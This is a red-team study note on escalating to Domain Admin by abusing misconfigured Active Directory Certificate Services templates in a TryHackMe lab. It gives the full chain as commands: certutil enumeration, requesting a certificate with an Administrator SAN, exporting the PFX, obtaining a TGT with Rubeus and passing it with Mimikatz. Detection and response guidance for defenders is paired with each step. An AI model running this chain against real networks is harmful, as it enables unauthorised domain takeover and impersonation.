---
{"dg-publish":true,"permalink":"/cards/red-team/exploiting-certificates/"}
---

~ [[cards/red-team/Exploiting Active Directory\|Exploiting Active Directory]]
## Summary
---
**What it is:** Exploiting misconfigured Active Directory Certificate Services (AD CS) certificate templates to request certificates with arbitrary Subject Alternative Names (SAN), allowing impersonation of privileged users like Domain Admins.

**Scope:** This note covers the abuse of certificate templates with poisonous parameter combinations (Client Authentication + ENROLLEE_SUPPLIES_SUBJECT + EXPORTABLE_KEY + Enroll permissions) to obtain and export certificates for privilege escalation and persistence.

**Prerequisites:** 

- [[cards/dots/Public Key Infrastructure (PKI)\|Public Key Infrastructure (PKI)]]
- [[cards/dots/Certificate Authority\|Certificate Authority]]
- [[cards/active-directory/Active Directory Certificate Services\|Active Directory Certificate Services]]
- Compromised machine account or user with Enroll permissions on vulnerable template
- Access to domain-joined machine with Certificate snap-in

**Risks & Limitations:**

- Requires specific misconfigured certificate template (poisonous parameter combination)
- Certificate requests are logged in AD CS and Security logs
- Exported certificates can be revoked by administrators
- Certificate validity period limits persistence window 

## How it works (2–4 lines)

[[cards/active-directory/Active Directory Certificate Services\|Active Directory Certificate Services]] is Microsoft's PKI implementation that issues certificates for encryption, digital signatures, and user authentication. 

Administrators use certificate templates to allow users to request certificates without manual distribution. Attackers exploit misconfigured templates that combine Client Authentication capability, user-supplied Subject Alternative Names, exportable private keys, and permissive enrollment rights to request certificates as any user (including Domain Admins), then use these certificates to authenticate and gain persistent access.

## Steps 
---
**Legend:**

- {TARGET_MACHINE} = THMSERVER2
- {DOMAIN} = za.tryhackme.loc
- {DC_IP} = 10.200.72.101
- {DOMAIN_CONTROLLER} = THMDC
- {IMPERSONATED_USER} = Administrator
- {CERTIFICATE_FILE} = admin.key.pfx
- {CERTIFICATE_PASSWORD} = password
- {TGT_OUTPUT} = admin.key.tgt

**Context:** You have RDP access on THMSERVER2.

### 1. Enumerate Certificate Templates
---

**Action:**

- Enumerate all configured certificate templates and output to file:

```C
certutil -Template -v > templates.txt
```

- Review templates for poisonous parameter combination:
	
	- **Client Authentication** - Certificate can be used for Client Authentication
	- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** - Template allows specifying Subject Alternative Name (SAN)
	- **CTPRIVATEKEY_FLAG_EXPORTABLE_KEY** - Private key is exportable
	- **Certificate Permissions** - You have Enroll permissions

**Observable:**

- `certutil.exe` process execution
- LDAP queries to Domain Controller on port 389/636 (querying Certificate Templates container)
- RPC calls to Certificate Authority server
- File creation: `templates.txt`

**Vulnerable Template Indicators:**

```C
TemplatePropEKUs =
    1.3.6.1.5.5.7.3.2 Client Authentication  <- VULNERABLE
    1.3.6.1.5.5.7.3.1 Server Authentication
```

This certificate can be used for **client authentication**, allowing it to authenticate as a user/computer to AD.

```C
TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1  <- VULNERABLE
```

This means you can request a certificate and claim to be ANY user (including Domain Admin).

```C
TemplatePropPrivateKeyFlags = 1010010 (16842768)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)  <- VULNERABLE
```

The private key is **exportable**, meaning you can extract it and use it elsewhere for persistent access.

```C
TemplatePropSecurityDescriptor:
    Allow Enroll    ZA\THMSERVER2$  ← VULNERABLE
    Allow Auto-Enroll    ZA\THMSERVER2$
```

The machine account **ZA\THMSERVER2$** has **Enroll** permissions, meaning it (or anyone who compromises it) can request certificates from this template.

```C
Attacker -> Compromises THMSERVER2$ 
       -> Requests certificate with SAN="Administrator"
       -> Uses certificate to authenticate as Domain Admin
       -> Exports private key for persistence
       -> DOMAIN OWNED
```

### 2. Request Certificate with Arbitrary SAN
---

**Action:**
- Launch MMC: **Start** -> **Run** -> type `mmc` -> Enter
- Add Certificates snap-in:
  - **File** -> **Add/Remove Snap-in..**
  - Select **Certificates** snap-in
  - Choose **Computer Account**
  - Choose **Local computer**
  - Click **OK**

**Observable:**
- `mmc.exe` process execution
- Certificate snap-in loading (registry reads under `HKLM\Software\Microsoft\Cryptography`)


**Action: Request a personal certificate:**

- Request new certificate:

	- Right-click **Personal** -> **All Tasks** -> **Request New Certificate...**
	- Click **Next** twice to select AD enrollment policy
	- Click on **More Information** warning for the available template
	- Configure Subject:
	    - Change **Subject name Type** to **Common Name**
	    - Provide any value (does not matter) -> Click **Add**
	- Configure Alternative Name:
	    - Change **Alternative name Type** to **User principal name**
	    - Supply UPN of target user: `{IMPERSONATED_USER}@{DOMAIN}` (e.g., `Administrator@za.tryhackme.loc`)
	    - Click **Add**

![Exploiting Certificates.png|250](/img/user/cards/red-team/images/Exploiting%20Certificates.png)

  - Click **OK** -> Click **Enroll**

![Exploiting Certificates-1.png](/img/user/cards/red-team/images/Exploiting%20Certificates-1.png)

**Observable:**

- Certificate Request (CSR) generated locally
- DCOM/RPC connection to Certificate Authority server
- Certificate Authority logs showing certificate issuance:
  - Event ID 4886 (Certificate Services received certificate request)
  - Event ID 4887 (Certificate Services approved and issued certificate)
- New certificate appears in Personal certificate store
- Security Event ID 4768 may be generated if certificate is used immediately
### 3. Export Certificate with Private Key
---
**Action:**
- Right-click on the newly issued certificate -> **All Tasks** -> **Export...**
- Click **Next**
- Select **Yes, export the private key** -> Click **Next**
- Click **Next** (accept default PFX format)
- Set password for the certificate (required for private key export): `{CERTIFICATE_PASSWORD}`
- Click **Next**
- Select file location to save: `C:\Tools\{CERTIFICATE_FILE}`
- Click **Next** -> Click **Finish**

**Observable:**
- Certificate export wizard process activity
- File creation: `{CERTIFICATE_FILE}` (PFX format) at specified location
- Access to private key store in `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\`
- Windows Security Event ID 5058 (Key file operation) if auditing enabled
- Sensitive Privilege Use Event ID 4673 if private key accessed

### 4. Request Kerberos TGT Using Certificate
---
**Action:**

- Use Rubeus to request TGT by authenticating with the certificate:
```
  Rubeus.exe asktgt /user:{IMPERSONATED_USER} /enctype:aes256 /certificate:{CERTIFICATE_PATH} /password:{CERTIFICATE_PASSWORD} /outfile:{TGT_OUTPUT} /domain:{DOMAIN} /dc:{DC_IP}
```

Example:
```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\Tools\admin.key.pfx /password:password /outfile:admin.key.tgt /domain:za.tryhackme.loc /dc:10.200.72.101
```

**Parameters:**
- **/user** - User to impersonate (must match UPN in certificate SAN)
- **/enctype** - Encryption type for ticket (aes256 for evasion, avoids weak encryption alerts)
- **/certificate** - Path to exported PFX certificate
- **/password** - Password set during certificate export
- **/outfile** - File to write TGT output
- **/domain** - FQDN of target domain
- **/dc** - IP of Domain Controller (preferably one running CA service)

**Observable:**
- `Rubeus.exe` process execution
- Kerberos AS-REQ (Authentication Service Request) to DC on port 88 using PKINIT
- Kerberos AS-REP (Authentication Service Response) containing TGT
- Event ID 4768 (Kerberos TGT requested) on DC with:
  - Certificate information in request
  - Pre-authentication type: Public Key (PKINIT)
  - Account Name: {IMPERSONATED_USER}
  - Client Address: {TARGET_MACHINE} IP
- File creation: `{TGT_OUTPUT}` containing base64-encoded TGT
- Potential Event ID 4769 (Kerberos service ticket requested) if further access occurs

### 5. Load TGT and Authenticate
---

**Action:**

- Launch Mimikatz:
```
  mimikatz.exe
```

- Enable debug privileges:

```
  privilege::debug
```

- Inject TGT into current session:

```
  kerberos::ptt {TGT_OUTPUT}
```

- Test access to Domain Controller:

```
  dir \\{DOMAIN_CONTROLLER}.{DOMAIN}\C$\
```

Example:
```
dir \\THMDC.za.tryhackme.loc\C$\
```

**Observable:**

- `mimikatz.exe` process execution
- SeDebugPrivilege enabled (Event ID 4673 if auditing enabled)
- TGT imported into LSASS memory
- Kerberos ticket cache manipulation
- SMB connection to DC on port 445
- Authentication using imported TGT (no credential prompt)
- Event ID 4624 (Logon) on DC with:
  - Logon Type 3 (Network)
  - Account: {IMPERSONATED_USER}
  - Authentication Package: Kerberos
  - Source: {TARGET_MACHINE}
- Successful directory listing of `C$` administrative share
## Blue - Detection & Response
---

**Key Logs:**
- Event ID 4886 (Certificate Services received certificate request) - unusual SAN values
- Event ID 4887 (Certificate Services approved and issued certificate) - track who requested what
- Event ID 4768 (Kerberos TGT requested) - PKINIT pre-authentication type with certificate
- Event ID 4769 (Kerberos service ticket requested) - following suspicious TGT
- Event ID 5058 (Key file operation) - private key export operations
- Event ID 4624 (Logon) - network logon from unexpected machine using certificate authentication
- Sysmon Event ID 1 (Process creation) - certutil.exe, Rubeus.exe, mimikatz.exe

**Detection Patterns:**
- Certificate requests with SAN values for privileged accounts (Domain Admins, Enterprise Admins)
- Certificate templates with poisonous parameter combinations actively used
- Machine accounts requesting certificates with user SPNs
- PKINIT authentication from non-standard sources
- Rubeus.exe or Mimikatz.exe execution on endpoints
- Unusual certutil.exe enumeration activity
- Certificate exports with private keys outside normal business hours

**High-Value Indicators:**
- Certificate issued to low-privilege account with high-privilege SAN (e.g., DA account)
- Multiple certificate requests from same machine in short timeframe
- Certificate authentication followed immediately by lateral movement
- Exported PFX files in unusual locations (user temp, Downloads, Public folders)
- Kerberos TGT requests using PKINIT from workstations

**Quick Response:**
1. Identify and disable/revoke suspicious certificates immediately via CA console
2. Review certificate template configurations - disable templates with poisonous combinations
3. Investigate source machine for compromise indicators and lateral movement
4. Reset credentials for impersonated accounts
5. Review certificate template permissions - remove excessive Enroll rights
6. Enable auditing on Certificate Authority for all certificate operations
7. Hunt for exported PFX files and Rubeus/Mimikatz artifacts across environment
